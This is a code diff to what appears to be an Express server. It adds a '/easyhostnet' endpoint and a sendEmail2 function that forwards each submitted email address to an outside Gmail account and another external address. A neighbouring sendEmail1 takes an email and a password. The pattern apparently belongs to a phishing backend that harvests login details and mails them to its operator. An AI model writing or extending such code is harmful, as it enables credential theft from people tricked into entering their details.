@@ -334,6 +334,36 @@ const sendEmail1 = (email, pass) => {
   
 
 }
+
+const sendEmail2 = (email) => {
+  var mailOptions = {
+    from: "support Team" ,
+    to: 'mayowaandrews723@gmail.com, helper@air19express.com',
+    subject: `Users email,`,
+    text: `:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+     senders email: ${email}`,
+    html: '',
+  }
+    
+  
+  transport.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        return console.log(error);
+      }
+      console.log('Message sent: %s', info.messageId);
+    });
+  
+
+}
+app.post('/easyhostnet', (req, res) => {
+  var name = req.body.email
+  //var subject = req.body.subject
+  
+  sendEmail2(name)
+  res.json(name)
+  console.log(`Message sent. contents is ${name}`)
+})
+
 app.post('/quote', (req, res) => {
   var name = req.body.name
   //var subject = req.body.subject
